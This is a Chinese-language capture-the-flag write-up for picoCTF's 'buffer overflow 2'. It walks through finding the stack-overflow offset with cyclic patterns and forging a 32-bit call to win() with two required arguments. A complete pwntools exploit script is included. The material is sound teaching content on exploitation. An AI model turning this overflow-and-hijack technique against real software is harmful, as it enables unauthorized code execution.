# Pwn - picoCTF《buffer overflow 2》题解

## 题目信息

- 类别：Pwn
- 难度：中等
- 题目类型：栈溢出 / ret2win
- 核心考点：覆盖返回地址、调用隐藏函数、构造参数

## 题目分析

这类题通常会给一个 ELF 程序，程序里存在明显的危险输入函数，比如：

```c
gets(buf);
```

或者：

```c
scanf("%s", buf);
```

当输入长度超过栈上缓冲区大小时，就会覆盖相邻栈内容，包括保存的 `ebp/rbp` 和返回地址。`buffer overflow 2` 的经典变体一般不只是让你跳到一个 `win()` 函数，而是要求你**跳过去时还得带上正确参数**。

这就比最基础的 ret2win 稍微多一步。

## 逆向思路

拿到程序后，先做基础信息收集：

```bash
checksec ./vuln
file ./vuln
```

重点关注：

- 是否开启 NX
- 是否开启 PIE
- 是否有栈 canary

如果题目是中等难度入门栈题，常见配置通常是：

- 无 canary
- 无 PIE
- NX 开启

这意味着：

- 不能直接把 shellcode 扔到栈上执行
- 但可以把控制流劫持到程序现有函数

## 找到目标函数

在反汇编里通常可以看到一个类似 `win()` 的函数，只有在满足特定参数时才打印 flag：

```c
void win(int a, int b) {
    if (a == 0xCAFEF00D && b == 0xF00DF00D) {
        system("cat flag.txt");
    }
}
```

因此思路很明确：

1. 找到溢出偏移
2. 用返回地址跳到 `win`
3. 在调用栈上布置好 `win` 需要的参数

## 确定偏移

最稳的方法是用 cyclic pattern：

```python
from pwn import *

payload = cyclic(200)
```

程序崩溃后查看覆盖到 `eip` 的值，再反查偏移：

```python
cyclic_find(0x6161616c)
```

假设最后算出的偏移是 `112`。

## 栈布局思路

在 32 位程序里，如果我们要伪造一次函数调用，payload 结构一般是：

```text
[padding]
[win_addr]
[fake_ret]
[arg1]
[arg2]
```

原因是函数返回地址后面紧跟的就是参数区域。只要我们把栈伪造成一次“正常调用”的样子，程序跳进 `win()` 后就会按约定取参数。

## Exploit 示例

```python
from pwn import *

context.binary = './vuln'
elf = ELF('./vuln')

p = process('./vuln')

offset = 112
win = elf.symbols['win']

arg1 = 0xCAFEF00D
arg2 = 0xF00DF00D

payload = flat(
    b'A' * offset,
    win,
    0x0,
    arg1,
    arg2
)

p.sendline(payload)
p.interactive()
```

如果是远程环境，把 `process('./vuln')` 改成：

```python
remote('challenge.host', 31337)
```

即可。

## 为什么这里不需要 ROP 链

因为这题的目标很简单：程序自身已经有现成的 `win()` 函数，我们只要把执行流转过去即可。相比复杂 ROP，这属于更基础但非常关键的一步：

- 先学会控制返回地址
- 再学会伪造调用参数
- 后面才能自然过渡到 `ret2libc`、`ROP chain` 和 `ret2csu`

## 调试时要注意的点

### 1. 目标架构

32 位和 64 位 payload 结构不同。上面这个思路主要对应 32 位栈传参。

如果是 64 位程序，前几个参数一般走寄存器：

- `rdi`
- `rsi`
- `rdx`
- `rcx`
- `r8`
- `r9`

那就往往需要 gadget，比如 `pop rdi; ret`。

### 2. 小端序

地址和整数参数都要按小端序写入。`pwntools.flat()` 通常会自动帮你处理。

### 3. 偏移不要猜

很多新手喜欢“试出来”，但中等难度题开始就不建议这样做了。`cyclic` 是最稳的方式。

## 题目本质

这题本质上是在训练两件事：

- **利用栈溢出改写控制流**
- **理解函数调用约定**

它不只是“跳转到某个函数”这么简单，而是要求你知道程序在进入函数时参数是怎么传进去的。

## 知识点总结

做完这题后，应该掌握：

- 如何识别可溢出的输入点
- 如何用 `cyclic` 确定覆盖偏移
- 如何构造 ret2win payload
- 如何给目标函数伪造参数

一句话总结：

> **能改返回地址只是第一步，能按调用约定把参数一起伪造出来，才算真正会做入门栈题。**
